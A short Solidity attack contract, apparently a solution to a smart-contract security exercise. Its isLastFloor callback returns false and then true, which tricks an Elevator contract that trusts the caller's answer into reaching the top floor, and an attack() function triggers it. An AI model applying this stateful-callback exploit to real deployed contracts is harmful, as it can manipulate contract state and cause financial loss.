// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Elevator.sol";

contract Building {
    Elevator elevator;
    uint counter = 0;

    constructor(address _elevatorAddress) {
        elevator = Elevator(_elevatorAddress);
    }

    function isLastFloor(uint _check) external returns (bool) {
        if (counter == 0) {
            counter += 1;
            return false;
        } else {
            return true;
        }
    }

    function attack() public {
        elevator.goTo(1);
    }
}
